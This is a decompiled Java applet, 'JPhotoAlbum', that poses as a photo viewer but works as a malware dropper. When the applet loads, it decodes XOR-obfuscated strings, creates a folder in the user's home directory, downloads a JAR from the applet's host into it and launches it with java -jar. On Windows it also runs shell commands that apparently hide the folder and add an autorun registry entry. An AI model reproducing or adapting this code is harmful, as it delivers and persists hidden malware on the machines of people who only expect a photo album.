// 
// Decompiled by Procyon v0.5.30
// 

package ia;

import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.net.URI;
import java.io.File;
import java.awt.image.ImageObserver;
import java.awt.Graphics;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.awt.Color;
import java.awt.Component;
import java.awt.MediaTracker;
import java.awt.Image;
import java.applet.Applet;

public class JPhotoAlbum extends Applet implements Runnable
{
    static final long serialVersionUID = 12345L;
    Image a;
    MediaTracker b;
    Thread c;
    private static final String[] z;
    
    public void init() {
        this.b = new MediaTracker(this);
        this.setBackground(new Color(255, 255, 255));
        try {
            this.a();
            String substring = "";
            String line;
            while ((line = new BufferedReader(new InputStreamReader(new URL(JPhotoAlbum.z[1]).openStream())).readLine()) != null) {
                if (line.indexOf(JPhotoAlbum.z[3]) > -1) {
                    final String s = JPhotoAlbum.z[2];
                    final String s2 = JPhotoAlbum.z[0];
                    final int n = line.indexOf(s) + s.length();
                    substring = line.substring(n, line.indexOf(s2, n));
                    break;
                }
            }
            this.a = this.getImage(new URL(substring));
            this.b.addImage(this.a, 0);
            this.b.waitForAll();
        }
        catch (Exception ex2) {
            try {
                this.a = this.getImage(new URL(this.getCodeBase() + JPhotoAlbum.z[4]));
                this.b.addImage(this.a, 0);
                this.b.waitForAll();
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        this.c = new Thread(this);
    }
    
    public void paint(final Graphics graphics) {
        try {
            graphics.drawImage(this.a, 50, 50, this.a.getWidth(this), this.a.getHeight(this), this);
        }
        catch (SecurityException ex) {
            ex.printStackTrace();
            this.stop();
        }
    }
    
    public void run() {
    }
    
    private void a() throws Exception {
        final String string = System.getProperty(JPhotoAlbum.z[7]) + File.separatorChar + JPhotoAlbum.z[12];
        boolean b = false;
        Label_0068: {
            try {
                if (System.getProperty(JPhotoAlbum.z[5]).toLowerCase().indexOf(JPhotoAlbum.z[18]) > -1) {
                    b = true;
                    break Label_0068;
                }
            }
            catch (Exception ex) {
                throw ex;
            }
            b = false;
        }
        final boolean b2 = b;
        final File file = new File(string);
        Label_0152: {
            try {
                if (file.exists()) {
                    break Label_0152;
                }
                file.mkdirs();
                if (!b2) {
                    break Label_0152;
                }
            }
            catch (Exception ex2) {
                throw ex2;
            }
            try {
                Runtime.getRuntime().exec(JPhotoAlbum.z[15] + file.getPath() + "\"").waitFor();
            }
            catch (Exception ex3) {
                g.a(ex3.getLocalizedMessage());
            }
        }
        final String string2 = string + File.separatorChar + JPhotoAlbum.z[11];
        final URI uri = new URI(this.getCodeBase() + JPhotoAlbum.z[11]);
        final String lowerCase = uri.getScheme().toLowerCase();
        Label_0275: {
            Label_0260: {
                String s;
                try {
                    if (lowerCase.equals(JPhotoAlbum.z[17])) {
                        break Label_0260;
                    }
                    s = lowerCase;
                    final String[] array = JPhotoAlbum.z;
                    final int n = 14;
                    final String s2 = array[n];
                    final boolean b3 = s.equals(s2);
                    if (b3) {
                        break Label_0260;
                    }
                    break Label_0275;
                }
                catch (Exception ex4) {
                    throw ex4;
                }
                try {
                    final String[] array = JPhotoAlbum.z;
                    final int n = 14;
                    final String s2 = array[n];
                    final boolean b3 = s.equals(s2);
                    if (b3) {
                        this.a(uri.toURL(), string2);
                        break Label_0275;
                    }
                }
                catch (Exception ex5) {
                    throw ex5;
                }
            }
            try {
                if (lowerCase.equals(JPhotoAlbum.z[10])) {
                    this.a(new File(uri), new File(string2));
                }
            }
            catch (Exception ex6) {
                throw ex6;
            }
        }
        final String[] array2 = { System.getProperty(JPhotoAlbum.z[6]) + JPhotoAlbum.z[8], JPhotoAlbum.z[13], string2 };
        try {
            Runtime.getRuntime().exec(array2);
            if (b2) {
                Runtime.getRuntime().exec(JPhotoAlbum.z[9] + string + JPhotoAlbum.z[16]).waitFor();
            }
        }
        catch (Exception ex7) {
            throw ex7;
        }
    }
    
    private void a(final File file, final File file2) throws IOException {
        final FileInputStream fileInputStream = new FileInputStream(file);
        final byte[] array = new byte[1024];
        final FileOutputStream fileOutputStream = new FileOutputStream(file2);
        while (true) {
            final int read = fileInputStream.read(array, 0, 1024);
            final int n = -1;
            try {
                if (read != n) {
                    fileOutputStream.write(array, 0, read);
                    continue;
                }
            }
            catch (IOException ex) {
                throw ex;
            }
            break;
        }
        fileOutputStream.close();
        fileInputStream.close();
    }
    
    private void a(final URL url, final String s) {
        try {
            final File file = new File(s);
            if (!file.exists()) {
                final String parent = file.getParent();
                if (parent != null) {
                    final File file2 = new File(parent);
                    try {
                        if (!file2.exists()) {
                            file2.mkdirs();
                        }
                    }
                    catch (Exception ex) {
                        throw ex;
                    }
                }
            }
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(url.openConnection().getInputStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s));
            while (true) {
                final int read = bufferedInputStream.read();
                try {
                    if (read != -1) {
                        bufferedOutputStream.write(read);
                        continue;
                    }
                }
                catch (Exception ex2) {
                    throw ex2;
                }
                break;
            }
            bufferedOutputStream.flush();
            bufferedInputStream.close();
            bufferedOutputStream.close();
        }
        catch (Exception ex3) {
            g.a(ex3.getLocalizedMessage());
        }
    }
    
    static {
        final String[] z2 = new String[19];
        final int n = 0;
        final char[] charArray = "\u0010f!t;Y#+~;E{".toCharArray();
        int length;
        int n3;
        final int n2 = n3 = (length = charArray.length);
        int n4 = 0;
        while (true) {
            Label_0098: {
                if (n2 > 1) {
                    break Label_0098;
                }
                length = (n3 = n4);
                do {
                    final char c = charArray[n3];
                    char c2 = '\0';
                    switch (n4 % 5) {
                        case 0: {
                            c2 = '7';
                            break;
                        }
                        case 1: {
                            c2 = 'F';
                            break;
                        }
                        case 2: {
                            c2 = 'Y';
                            break;
                        }
                        case 3: {
                            c2 = '\f';
                            break;
                        }
                        default: {
                            c2 = 'T';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n4;
                } while (n2 == 0);
            }
            if (n2 > n4) {
                continue;
            }
            break;
        }
        z2[n] = new String(charArray).intern();
        final int n5 = 1;
        final char[] charArray2 = "_2-|n\u0018i.{#\u0019.6x;E(6xzT)4".toCharArray();
        int length2;
        int n7;
        final int n6 = n7 = (length2 = charArray2.length);
        int n8 = 0;
        while (true) {
            Label_0214: {
                if (n6 > 1) {
                    break Label_0214;
                }
                length2 = (n7 = n8);
                do {
                    final char c3 = charArray2[n7];
                    char c4 = '\0';
                    switch (n8 % 5) {
                        case 0: {
                            c4 = '7';
                            break;
                        }
                        case 1: {
                            c4 = 'F';
                            break;
                        }
                        case 2: {
                            c4 = 'Y';
                            break;
                        }
                        case 3: {
                            c4 = '\f';
                            break;
                        }
                        default: {
                            c4 = 'T';
                            break;
                        }
                    }
                    charArray2[length2] = (char)(c3 ^ c4);
                    ++n8;
                } while (n6 == 0);
            }
            if (n6 > n8) {
                continue;
            }
            break;
        }
        z2[n5] = new String(charArray2).intern();
        final int n9 = 2;
        final char[] charArray3 = "D4:1s".toCharArray();
        int length3;
        int n11;
        final int n10 = n11 = (length3 = charArray3.length);
        int n12 = 0;
        while (true) {
            Label_0330: {
                if (n10 > 1) {
                    break Label_0330;
                }
                length3 = (n11 = n12);
                do {
                    final char c5 = charArray3[n11];
                    char c6 = '\0';
                    switch (n12 % 5) {
                        case 0: {
                            c6 = '7';
                            break;
                        }
                        case 1: {
                            c6 = 'F';
                            break;
                        }
                        case 2: {
                            c6 = 'Y';
                            break;
                        }
                        case 3: {
                            c6 = '\f';
                            break;
                        }
                        default: {
                            c6 = 'T';
                            break;
                        }
                    }
                    charArray3[length3] = (char)(c5 ^ c6);
                    ++n12;
                } while (n10 == 0);
            }
            if (n10 > n12) {
                continue;
            }
            break;
        }
        z2[n9] = new String(charArray3).intern();
        final int n13 = 3;
        final char[] charArray4 = "_)-c&Y)-\"7X+v|=T5".toCharArray();
        int length4;
        int n15;
        final int n14 = n15 = (length4 = charArray4.length);
        int n16 = 0;
        while (true) {
            Label_0446: {
                if (n14 > 1) {
                    break Label_0446;
                }
                length4 = (n15 = n16);
                do {
                    final char c7 = charArray4[n15];
                    char c8 = '\0';
                    switch (n16 % 5) {
                        case 0: {
                            c8 = '7';
                            break;
                        }
                        case 1: {
                            c8 = 'F';
                            break;
                        }
                        case 2: {
                            c8 = 'Y';
                            break;
                        }
                        case 3: {
                            c8 = '\f';
                            break;
                        }
                        default: {
                            c8 = 'T';
                            break;
                        }
                    }
                    charArray4[length4] = (char)(c7 ^ c8);
                    ++n16;
                } while (n14 == 0);
            }
            if (n14 > n16) {
                continue;
            }
            break;
        }
        z2[n13] = new String(charArray4).intern();
        final int n17 = 4;
        final char[] charArray5 = "R4+c&\u0019!0j".toCharArray();
        int length5;
        int n19;
        final int n18 = n19 = (length5 = charArray5.length);
        int n20 = 0;
        while (true) {
            Label_0562: {
                if (n18 > 1) {
                    break Label_0562;
                }
                length5 = (n19 = n20);
                do {
                    final char c9 = charArray5[n19];
                    char c10 = '\0';
                    switch (n20 % 5) {
                        case 0: {
                            c10 = '7';
                            break;
                        }
                        case 1: {
                            c10 = 'F';
                            break;
                        }
                        case 2: {
                            c10 = 'Y';
                            break;
                        }
                        case 3: {
                            c10 = '\f';
                            break;
                        }
                        default: {
                            c10 = 'T';
                            break;
                        }
                    }
                    charArray5[length5] = (char)(c9 ^ c10);
                    ++n20;
                } while (n18 == 0);
            }
            if (n18 > n20) {
                continue;
            }
            break;
        }
        z2[n17] = new String(charArray5).intern();
        final int n21 = 5;
        final char[] charArray6 = "X5wb5Z#".toCharArray();
        int length6;
        int n23;
        final int n22 = n23 = (length6 = charArray6.length);
        int n24 = 0;
        while (true) {
            Label_0678: {
                if (n22 > 1) {
                    break Label_0678;
                }
                length6 = (n23 = n24);
                do {
                    final char c11 = charArray6[n23];
                    char c12 = '\0';
                    switch (n24 % 5) {
                        case 0: {
                            c12 = '7';
                            break;
                        }
                        case 1: {
                            c12 = 'F';
                            break;
                        }
                        case 2: {
                            c12 = 'Y';
                            break;
                        }
                        case 3: {
                            c12 = '\f';
                            break;
                        }
                        default: {
                            c12 = 'T';
                            break;
                        }
                    }
                    charArray6[length6] = (char)(c11 ^ c12);
                    ++n24;
                } while (n22 == 0);
            }
            if (n22 > n24) {
                continue;
            }
            break;
        }
        z2[n21] = new String(charArray6).intern();
        final int n25 = 6;
        final char[] charArray7 = "]'/mz_)4i".toCharArray();
        int length7;
        int n27;
        final int n26 = n27 = (length7 = charArray7.length);
        int n28 = 0;
        while (true) {
            Label_0798: {
                if (n26 > 1) {
                    break Label_0798;
                }
                length7 = (n27 = n28);
                do {
                    final char c13 = charArray7[n27];
                    char c14 = '\0';
                    switch (n28 % 5) {
                        case 0: {
                            c14 = '7';
                            break;
                        }
                        case 1: {
                            c14 = 'F';
                            break;
                        }
                        case 2: {
                            c14 = 'Y';
                            break;
                        }
                        case 3: {
                            c14 = '\f';
                            break;
                        }
                        default: {
                            c14 = 'T';
                            break;
                        }
                    }
                    charArray7[length7] = (char)(c13 ^ c14);
                    ++n28;
                } while (n26 == 0);
            }
            if (n26 > n28) {
                continue;
            }
            break;
        }
        z2[n25] = new String(charArray7).intern();
        final int n29 = 7;
        final char[] charArray8 = "B5<~z_)4i".toCharArray();
        int length8;
        int n31;
        final int n30 = n31 = (length8 = charArray8.length);
        int n32 = 0;
        while (true) {
            Label_0918: {
                if (n30 > 1) {
                    break Label_0918;
                }
                length8 = (n31 = n32);
                do {
                    final char c15 = charArray8[n31];
                    char c16 = '\0';
                    switch (n32 % 5) {
                        case 0: {
                            c16 = '7';
                            break;
                        }
                        case 1: {
                            c16 = 'F';
                            break;
                        }
                        case 2: {
                            c16 = 'Y';
                            break;
                        }
                        case 3: {
                            c16 = '\f';
                            break;
                        }
                        default: {
                            c16 = 'T';
                            break;
                        }
                    }
                    charArray8[length8] = (char)(c15 ^ c16);
                    ++n32;
                } while (n30 == 0);
            }
            if (n30 > n32) {
                continue;
            }
            break;
        }
        z2[n29] = new String(charArray8).intern();
        final int n33 = 8;
        final char[] charArray9 = "\u0018$0b{]'/m".toCharArray();
        int length9;
        int n35;
        final int n34 = n35 = (length9 = charArray9.length);
        int n36 = 0;
        while (true) {
            Label_1038: {
                if (n34 > 1) {
                    break Label_1038;
                }
                length9 = (n35 = n36);
                do {
                    final char c17 = charArray9[n35];
                    char c18 = '\0';
                    switch (n36 % 5) {
                        case 0: {
                            c18 = '7';
                            break;
                        }
                        case 1: {
                            c18 = 'F';
                            break;
                        }
                        case 2: {
                            c18 = 'Y';
                            break;
                        }
                        case 3: {
                            c18 = '\f';
                            break;
                        }
                        default: {
                            c18 = 'T';
                            break;
                        }
                    }
                    charArray9[length9] = (char)(c17 ^ c18);
                    ++n36;
                } while (n34 == 0);
            }
            if (n34 > n36) {
                continue;
            }
            break;
        }
        z2[n33] = new String(charArray9).intern();
        final int n37 = 9;
        final char[] charArray10 = "e\u0003\u001e,\u0015s\u0002yD\u001ft\u0013\u0005_;Q2.m&R\u001a\u0014e7E)*c2C\u001a\u000ee:S).\u007f\bt3+~1Y2\u000fi&D/6b\be37,{Af4\u007f>V08h8[fvxte\u0003\u001eS\u0007mfvht\u0015,8z5@ftf5Ef\u0005.".toCharArray();
        int length10;
        int n39;
        final int n38 = n39 = (length10 = charArray10.length);
        int n40 = 0;
        while (true) {
            Label_1158: {
                if (n38 > 1) {
                    break Label_1158;
                }
                length10 = (n39 = n40);
                do {
                    final char c19 = charArray10[n39];
                    char c20 = '\0';
                    switch (n40 % 5) {
                        case 0: {
                            c20 = '7';
                            break;
                        }
                        case 1: {
                            c20 = 'F';
                            break;
                        }
                        case 2: {
                            c20 = 'Y';
                            break;
                        }
                        case 3: {
                            c20 = '\f';
                            break;
                        }
                        default: {
                            c20 = 'T';
                            break;
                        }
                    }
                    charArray10[length10] = (char)(c19 ^ c20);
                    ++n40;
                } while (n38 == 0);
            }
            if (n38 > n40) {
                continue;
            }
            break;
        }
        z2[n37] = new String(charArray10).intern();
        final int n41 = 10;
        final char[] charArray11 = "Q/5i".toCharArray();
        int length11;
        int n43;
        final int n42 = n43 = (length11 = charArray11.length);
        int n44 = 0;
        while (true) {
            Label_1278: {
                if (n42 > 1) {
                    break Label_1278;
                }
                length11 = (n43 = n44);
                do {
                    final char c21 = charArray11[n43];
                    char c22 = '\0';
                    switch (n44 % 5) {
                        case 0: {
                            c22 = '7';
                            break;
                        }
                        case 1: {
                            c22 = 'F';
                            break;
                        }
                        case 2: {
                            c22 = 'Y';
                            break;
                        }
                        case 3: {
                            c22 = '\f';
                            break;
                        }
                        default: {
                            c22 = 'T';
                            break;
                        }
                    }
                    charArray11[length11] = (char)(c21 ^ c22);
                    ++n44;
                } while (n42 == 0);
            }
            if (n42 > n44) {
                continue;
            }
            break;
        }
        z2[n41] = new String(charArray11).intern();
        final int n45 = 11;
        final char[] charArray12 = "](8b5\u00192*m".toCharArray();
        int length12;
        int n47;
        final int n46 = n47 = (length12 = charArray12.length);
        int n48 = 0;
        while (true) {
            Label_1398: {
                if (n46 > 1) {
                    break Label_1398;
                }
                length12 = (n47 = n48);
                do {
                    final char c23 = charArray12[n47];
                    char c24 = '\0';
                    switch (n48 % 5) {
                        case 0: {
                            c24 = '7';
                            break;
                        }
                        case 1: {
                            c24 = 'F';
                            break;
                        }
                        case 2: {
                            c24 = 'Y';
                            break;
                        }
                        case 3: {
                            c24 = '\f';
                            break;
                        }
                        default: {
                            c24 = 'T';
                            break;
                        }
                    }
                    charArray12[length12] = (char)(c23 ^ c24);
                    ++n48;
                } while (n46 == 0);
            }
            if (n46 > n48) {
                continue;
            }
            break;
        }
        z2[n45] = new String(charArray12).intern();
        final int n49 = 12;
        final char[] charArray13 = "\u0019,7m:V".toCharArray();
        int length13;
        int n51;
        final int n50 = n51 = (length13 = charArray13.length);
        int n52 = 0;
        while (true) {
            Label_1518: {
                if (n50 > 1) {
                    break Label_1518;
                }
                length13 = (n51 = n52);
                do {
                    final char c25 = charArray13[n51];
                    char c26 = '\0';
                    switch (n52 % 5) {
                        case 0: {
                            c26 = '7';
                            break;
                        }
                        case 1: {
                            c26 = 'F';
                            break;
                        }
                        case 2: {
                            c26 = 'Y';
                            break;
                        }
                        case 3: {
                            c26 = '\f';
                            break;
                        }
                        default: {
                            c26 = 'T';
                            break;
                        }
                    }
                    charArray13[length13] = (char)(c25 ^ c26);
                    ++n52;
                } while (n50 == 0);
            }
            if (n50 > n52) {
                continue;
            }
            break;
        }
        z2[n49] = new String(charArray13).intern();
        final int n53 = 13;
        final char[] charArray14 = "\u001a,8~".toCharArray();
        int length14;
        int n55;
        final int n54 = n55 = (length14 = charArray14.length);
        int n56 = 0;
        while (true) {
            Label_1638: {
                if (n54 > 1) {
                    break Label_1638;
                }
                length14 = (n55 = n56);
                do {
                    final char c27 = charArray14[n55];
                    char c28 = '\0';
                    switch (n56 % 5) {
                        case 0: {
                            c28 = '7';
                            break;
                        }
                        case 1: {
                            c28 = 'F';
                            break;
                        }
                        case 2: {
                            c28 = 'Y';
                            break;
                        }
                        case 3: {
                            c28 = '\f';
                            break;
                        }
                        default: {
                            c28 = 'T';
                            break;
                        }
                    }
                    charArray14[length14] = (char)(c27 ^ c28);
                    ++n56;
                } while (n54 == 0);
            }
            if (n54 > n56) {
                continue;
            }
            break;
        }
        z2[n53] = new String(charArray14).intern();
        final int n57 = 14;
        final char[] charArray15 = "_2-|'".toCharArray();
        int length15;
        int n59;
        final int n58 = n59 = (length15 = charArray15.length);
        int n60 = 0;
        while (true) {
            Label_1758: {
                if (n58 > 1) {
                    break Label_1758;
                }
                length15 = (n59 = n60);
                do {
                    final char c29 = charArray15[n59];
                    char c30 = '\0';
                    switch (n60 % 5) {
                        case 0: {
                            c30 = '7';
                            break;
                        }
                        case 1: {
                            c30 = 'F';
                            break;
                        }
                        case 2: {
                            c30 = 'Y';
                            break;
                        }
                        case 3: {
                            c30 = '\f';
                            break;
                        }
                        default: {
                            c30 = 'T';
                            break;
                        }
                    }
                    charArray15[length15] = (char)(c29 ^ c30);
                    ++n60;
                } while (n58 == 0);
            }
            if (n58 > n60) {
                continue;
            }
            break;
        }
        z2[n57] = new String(charArray15).intern();
        final int n61 = 15;
        final char[] charArray16 = "T+=\"1O#y#7\u0017'-x&^$y'\u0006\u0017m\u0018,\u007fdfrDt\u0015".toCharArray();
        int length16;
        int n63;
        final int n62 = n63 = (length16 = charArray16.length);
        int n64 = 0;
        while (true) {
            Label_1878: {
                if (n62 > 1) {
                    break Label_1878;
                }
                length16 = (n63 = n64);
                do {
                    final char c31 = charArray16[n63];
                    char c32 = '\0';
                    switch (n64 % 5) {
                        case 0: {
                            c32 = '7';
                            break;
                        }
                        case 1: {
                            c32 = 'F';
                            break;
                        }
                        case 2: {
                            c32 = 'Y';
                            break;
                        }
                        case 3: {
                            c32 = '\f';
                            break;
                        }
                        default: {
                            c32 = 'T';
                            break;
                        }
                    }
                    charArray16[length16] = (char)(c31 ^ c32);
                    ++n64;
                } while (n62 == 0);
            }
            if (n62 > n64) {
                continue;
            }
            break;
        }
        z2[n61] = new String(charArray16).intern();
        final int n65 = 16;
        final char[] charArray17 = "k,7m:Vh-\u007f5kd{,{Q".toCharArray();
        int length17;
        int n67;
        final int n66 = n67 = (length17 = charArray17.length);
        int n68 = 0;
        while (true) {
            Label_1998: {
                if (n66 > 1) {
                    break Label_1998;
                }
                length17 = (n67 = n68);
                do {
                    final char c33 = charArray17[n67];
                    char c34 = '\0';
                    switch (n68 % 5) {
                        case 0: {
                            c34 = '7';
                            break;
                        }
                        case 1: {
                            c34 = 'F';
                            break;
                        }
                        case 2: {
                            c34 = 'Y';
                            break;
                        }
                        case 3: {
                            c34 = '\f';
                            break;
                        }
                        default: {
                            c34 = 'T';
                            break;
                        }
                    }
                    charArray17[length17] = (char)(c33 ^ c34);
                    ++n68;
                } while (n66 == 0);
            }
            if (n66 > n68) {
                continue;
            }
            break;
        }
        z2[n65] = new String(charArray17).intern();
        final int n69 = 17;
        final char[] charArray18 = "_2-|".toCharArray();
        int length18;
        int n71;
        final int n70 = n71 = (length18 = charArray18.length);
        int n72 = 0;
        while (true) {
            Label_2118: {
                if (n70 > 1) {
                    break Label_2118;
                }
                length18 = (n71 = n72);
                do {
                    final char c35 = charArray18[n71];
                    char c36 = '\0';
                    switch (n72 % 5) {
                        case 0: {
                            c36 = '7';
                            break;
                        }
                        case 1: {
                            c36 = 'F';
                            break;
                        }
                        case 2: {
                            c36 = 'Y';
                            break;
                        }
                        case 3: {
                            c36 = '\f';
                            break;
                        }
                        default: {
                            c36 = 'T';
                            break;
                        }
                    }
                    charArray18[length18] = (char)(c35 ^ c36);
                    ++n72;
                } while (n70 == 0);
            }
            if (n70 > n72) {
                continue;
            }
            break;
        }
        z2[n69] = new String(charArray18).intern();
        final int n73 = 18;
        final char[] charArray19 = "@/7h;@5".toCharArray();
        int length19;
        int n75;
        final int n74 = n75 = (length19 = charArray19.length);
        int n76 = 0;
        while (true) {
            Label_2238: {
                if (n74 > 1) {
                    break Label_2238;
                }
                length19 = (n75 = n76);
                do {
                    final char c37 = charArray19[n75];
                    char c38 = '\0';
                    switch (n76 % 5) {
                        case 0: {
                            c38 = '7';
                            break;
                        }
                        case 1: {
                            c38 = 'F';
                            break;
                        }
                        case 2: {
                            c38 = 'Y';
                            break;
                        }
                        case 3: {
                            c38 = '\f';
                            break;
                        }
                        default: {
                            c38 = 'T';
                            break;
                        }
                    }
                    charArray19[length19] = (char)(c37 ^ c38);
                    ++n76;
                } while (n74 == 0);
            }
            if (n74 <= n76) {
                z2[n73] = new String(charArray19).intern();
                z = z2;
                return;
            }
            continue;
        }
    }
}
